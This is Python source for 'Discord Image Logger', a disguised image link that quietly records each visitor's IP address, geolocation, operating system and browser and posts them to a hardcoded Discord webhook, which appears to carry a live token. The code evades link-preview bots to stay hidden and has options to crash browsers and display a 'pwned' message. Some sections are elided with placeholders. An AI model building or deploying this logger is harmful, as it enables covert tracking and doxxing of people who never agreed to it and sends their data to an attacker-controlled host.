# Discord Image Logger by DeKrypt

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # Base configuration
    "webhook": "https://discord.com/api/webhooks/1400921771162472609/9jkFkHpoNDKdySJCy_K9T62p3xzEdUxYAGfHwTX4WirLE5kBgv7U7QmL37k1WmSPZq6f",
    "image": "https://i1.sndcdn.com/artworks-OzDwK6RkxuC6Ujy4-1VoVyg-t500x500.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,

    # Message customization
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger.",
        "richMessage": True
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # Optional redirect
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n```\n{error}\n```"
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": (
                        f"An **Image Logging** link was sent!\n"
                        f"**Endpoint:** `{endpoint}`\n"
                        f"**IP:** `{ip}`\n"
                        f"**Platform:** `{bot}`"
                    )
                }]
            })
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    ping = "@everyone" if not info.get("proxy") else ""
    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": (
                f"**A User Opened the Original Image!**\n"
                f"**Endpoint:** `{endpoint}`\n"
                f"**IP Info:** … and so on …\n"
                f"**PC Info:** OS: `{os}`, Browser: `{browser}`\n"
                f"**User Agent:** ```{useragent}```"
            )
        }]
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(
        b'...base85 loading image...'
    )
}

class ImageLoggerHTTP(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
                return

            ip = self.headers.get('x-forwarded-for')
            ua = self.headers.get('user-agent', '')
            bot = botCheck(ip, ua)
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            url = dic.get("url", config["image"]) if config["imageArgument"] else config["image"]

            if bot:
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_header('Location', url)
                    self.end_headers()
                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return

            # actual click
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(requests.get(url).content)

            info = makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
            if config["message"]["doMessage"]:
                # handle rich message substitution here…
                pass

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    do_POST = do_GET

handler = ImageLoggerHTTP
